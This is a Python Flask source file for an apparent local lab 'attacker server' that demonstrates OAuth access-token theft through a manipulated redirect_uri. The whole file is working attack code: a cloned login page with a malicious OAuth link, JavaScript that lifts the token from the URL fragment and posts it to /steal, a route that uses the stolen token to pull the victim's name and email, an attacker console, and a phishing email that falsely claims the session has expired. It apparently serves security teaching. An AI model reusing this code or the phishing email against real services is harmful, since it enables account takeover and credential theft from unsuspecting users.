import smtplib
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import requests
from flask import Flask, jsonify, redirect, render_template_string, request

app = Flask(__name__)

# Internal Docker hostnames
OAUTH_SERVER  = "http://oauth-server:8083"
MAILHOG_HOST  = "mailhog"
MAILHOG_PORT  = 1025

# In-memory log of stolen tokens
stolen_tokens = []

# ─────────────────────────────────────────────────────────────
#  Malicious OAuth URL
#  redirect_uri → attacker's /collect  (the exploit)
# ─────────────────────────────────────────────────────────────
MALICIOUS_OAUTH = (
    "http://localhost:8083/authorize"
    "?client_id=myapp_client"
    "&redirect_uri=http://localhost:8082/collect"
    "&response_type=token"
    "&scope=read_profile"
)

# ─────────────────────────────────────────────────────────────
#  Templates
# ─────────────────────────────────────────────────────────────

# Pixel-perfect clone of the real MyApp landing page
FAKE_MYAPP = """
<!DOCTYPE html>
<html>
<head>
  <title>MyApp</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: #1a1a2e; color: #fff;
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh;
    }
    .card { text-align: center; }
    h1 { font-size: 52px; font-weight: 700; color: #e94560; margin-bottom: 12px; }
    .tagline { color: #aaa; font-size: 16px; margin-bottom: 36px; }
    .btn {
      background: #e94560; color: #fff;
      padding: 14px 42px; border-radius: 30px;
      text-decoration: none; font-size: 16px; font-weight: 600;
    }
    /* Tiny red flag for demo clarity — remove for a more convincing demo */
    .attacker-badge {
      margin-top: 20px; font-size: 11px;
      color: #ff4444; opacity: 0.5;
    }
  </style>
</head>
<body>
<div class="card">
  <h1>MyApp</h1>
  <p class="tagline">Your trusted productivity platform</p>
  <!-- MALICIOUS: redirect_uri → attacker /collect -->
  <a class="btn" href="{{ malicious_url }}">Login with OAuth</a>
  <p class="attacker-badge">localhost:8082 — FAKE clone (attacker server)</p>
</div>
</body>
</html>
"""

# Intermediate page: JS extracts the token from the URL fragment and
# POSTs it to /steal, then follows the redirect to the real MyApp.
COLLECT_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Logging in…</title></head>
<body style="font-family:Arial;display:flex;align-items:center;justify-content:center;
             height:100vh;background:#1a1a2e;color:#fff;text-align:center;">
  <div>
    <p style="font-size:18px">⏳ Logging you in…</p>
    <p style="font-size:12px;color:#555;margin-top:8px">(this takes just a moment)</p>
  </div>
  <script>
    // URL fragments (#…) are never sent to the server automatically.
    // JS reads them here, then POSTs to /steal.
    const frag   = window.location.hash.substring(1);
    const params = new URLSearchParams(frag);
    const token  = params.get('access_token');

    if (token) {
      fetch('/steal', {
        method:  'POST',
        headers: {'Content-Type': 'application/json'},
        body:    JSON.stringify({ token }),
      })
      .then(r => r.json())
      .then(data => {
        // Silently redirect victim to the REAL MyApp dashboard.
        // Victim sees their real dashboard — zero suspicion.
        window.location.href = data.redirect;
      })
      .catch(() => {
        // Fallback — still send victim to real site
        window.location.href = 'http://localhost:8081';
      });
    } else {
      window.location.href = 'http://localhost:8081';
    }
  </script>
</body>
</html>
"""

# Attacker's monitoring console
CONSOLE_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>🎯 Attacker Console</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: monospace; background: #0d0d0d; color: #00ff00; padding: 24px; }
    h1   { color: #ff4444; font-size: 22px; margin-bottom: 4px; }
    .sub { color: #555; font-size: 13px; margin-bottom: 20px; }
    .actions { margin-bottom: 24px; }
    .actions a {
      display: inline-block; margin-right: 12px; padding: 8px 18px;
      background: #1a1a1a; border: 1px solid #333; border-radius: 6px;
      color: #00aaff; text-decoration: none; font-size: 13px;
    }
    .actions a:hover { border-color: #00aaff; }
    .badge {
      display: inline-block; background: #ff4444; color: #fff;
      padding: 1px 8px; border-radius: 4px; font-size: 11px; margin-left: 6px;
    }
    .empty { color: #333; font-size: 14px; margin-top: 20px; }
    .token-card {
      background: #111; border: 1px solid #00ff00;
      border-radius: 8px; padding: 16px; margin-bottom: 16px;
    }
    .row { margin: 6px 0; font-size: 13px; }
    .lbl { color: #555; display: inline-block; width: 80px; }
    .val { color: #00ff00; word-break: break-all; }
    .time-val { color: #aaa; }
  </style>
  <meta http-equiv="refresh" content="4">
</head>
<body>
  <h1>🎯 Attacker Console</h1>
  <p class="sub">Auto-refreshes every 4 seconds</p>

  <div class="actions">
    <a href="/send-phishing">📧 Send Phishing Email via MailHog</a>
    <a href="http://localhost:8025" target="_blank">📥 Open MailHog Inbox</a>
    <a href="/">🪞 View Fake Clone</a>
  </div>

  <h3>
    Stolen Tokens
    <span class="badge">{{ count }}</span>
  </h3>

  {% if tokens %}
    {% for t in tokens %}
    <div class="token-card">
      <div class="row"><span class="lbl">⏰ Time</span>  <span class="val time-val">{{ t.time }}</span></div>
      <div class="row"><span class="lbl">👤 Name</span>  <span class="val">{{ t.name }}</span></div>
      <div class="row"><span class="lbl">📧 Email</span> <span class="val">{{ t.email }}</span></div>
      <div class="row"><span class="lbl">🔑 Token</span> <span class="val">{{ t.token }}</span></div>
    </div>
    {% endfor %}
  {% else %}
    <p class="empty">No tokens stolen yet. Waiting for victim to click the phishing link…</p>
  {% endif %}
</body>
</html>
"""


# ─────────────────────────────────────────────────────────────
#  Routes
# ─────────────────────────────────────────────────────────────

@app.route('/')
def fake_myapp():
    """Fake MyApp clone — victim lands here from the phishing email."""
    return render_template_string(FAKE_MYAPP, malicious_url=MALICIOUS_OAUTH)


@app.route('/collect')
def collect():
    """
    OAuth server redirects here with token in the URL fragment.
    Fragment is never sent to the server, so we use a JS bridge to
    read it client-side and POST it to /steal.
    """
    return render_template_string(COLLECT_PAGE)


@app.route('/steal', methods=['POST'])
def steal():
    """
    Receives the stolen token from the victim's browser.
    1. Calls /userinfo on the OAuth server using the token.
    2. Logs the stolen credentials.
    3. Returns the real MyApp dashboard URL so the victim sees nothing unusual.
    """
    data  = request.get_json(silent=True) or {}
    token = data.get('token', '').strip()

    if not token:
        return jsonify({"redirect": "http://localhost:8081"}), 400

    # Use the stolen token against the OAuth server
    try:
        resp = requests.get(
            f"{OAUTH_SERVER}/userinfo",
            headers={"Authorization": f"Bearer {token}"},
            timeout=3,
        )
        user_info = resp.json() if resp.status_code == 200 else {}
    except Exception:
        user_info = {}

    entry = {
        "token": token,
        "name":  user_info.get("name",  "Unknown"),
        "email": user_info.get("email", "Unknown"),
        "time":  datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    stolen_tokens.append(entry)

    print("\n" + "="*55)
    print(f"  [STOLEN]   Token : {token}")
    print(f"  [USERINFO] Name  : {entry['name']}")
    print(f"  [USERINFO] Email : {entry['email']}")
    print(f"  [TIME]           : {entry['time']}")
    print("="*55 + "\n")

    # Redirect victim to real MyApp — they never know what happened
    return jsonify({"redirect": f"http://localhost:8081/dashboard?token={token}"})


@app.route('/console')
def console():
    """Attacker's monitoring dashboard."""
    return render_template_string(
        CONSOLE_PAGE,
        tokens=list(reversed(stolen_tokens)),
        count=len(stolen_tokens),
    )


@app.route('/send-phishing')
def send_phishing():
    """
    Sends a phishing email via MailHog (local SMTP).
    Victim opens MailHog at localhost:8025 to see it.
    """
    html_body = f"""
<html>
<body style="margin:0;padding:0;background:#f5f5f5;font-family:Arial,sans-serif;">
  <table width="100%" cellpadding="0" cellspacing="0">
    <tr>
      <td align="center" style="padding:40px 0;">
        <table width="500" cellpadding="0" cellspacing="0"
               style="background:#fff;border-radius:12px;overflow:hidden;
                      box-shadow:0 2px 12px rgba(0,0,0,.1);">
          <!-- Header -->
          <tr>
            <td style="background:#e94560;padding:28px;text-align:center;">
              <h1 style="color:#fff;margin:0;font-size:28px;">MyApp</h1>
            </td>
          </tr>
          <!-- Body -->
          <tr>
            <td style="padding:32px;">
              <p style="color:#333;font-size:16px;">Hi John,</p>
              <p style="color:#555;margin:16px 0;">
                Your <b>MyApp</b> session has expired.
                Please click the button below to securely re-login and
                continue where you left off.
              </p>
              <div style="text-align:center;margin:32px 0;">
                <a href="http://localhost:8082"
                   style="background:#e94560;color:#fff;padding:14px 36px;
                          border-radius:30px;text-decoration:none;
                          font-size:16px;font-weight:600;">
                  Login to MyApp
                </a>
              </div>
              <p style="color:#999;font-size:12px;">
                If you did not request this, you can safely ignore this email.
              </p>
            </td>
          </tr>
          <!-- Footer -->
          <tr>
            <td style="background:#f8f8f8;padding:16px;text-align:center;
                       color:#aaa;font-size:12px;">
              © 2024 MyApp Inc. &nbsp;|&nbsp;
              <a href="#" style="color:#aaa;">Unsubscribe</a>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>
"""
    msg = MIMEMultipart('alternative')
    msg['Subject'] = "Your MyApp session has expired — please re-login"
    msg['From']    = "noreply@myapp.com"
    msg['To']      = "john@example.com"
    msg.attach(MIMEText(html_body, 'html'))

    try:
        with smtplib.SMTP(MAILHOG_HOST, MAILHOG_PORT, timeout=5) as smtp:
            smtp.sendmail("noreply@myapp.com", "john@example.com", msg.as_string())
        return """
        <html><body style="font-family:Arial;padding:40px;background:#0d0d0d;color:#00ff00;">
          <h3>✅ Phishing email sent!</h3>
          <p>Check the victim inbox at
             <a href='http://localhost:8025' style='color:#00aaff;'>localhost:8025</a>
          </p>
          <a href='/console' style='color:#00aaff;'>← Back to console</a>
        </body></html>
        """
    except Exception as exc:
        return f"""
        <html><body style="font-family:Arial;padding:40px;background:#0d0d0d;color:#ff4444;">
          <h3>❌ Failed to send email</h3>
          <p>{exc}</p>
          <p>Is MailHog running? Check docker-compose.</p>
          <a href='/console' style='color:#00aaff;'>← Back to console</a>
        </body></html>
        """, 500


@app.route('/health')
def health():
    return jsonify({"status": "ok", "server": "attacker-server"})


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8082, debug=False)
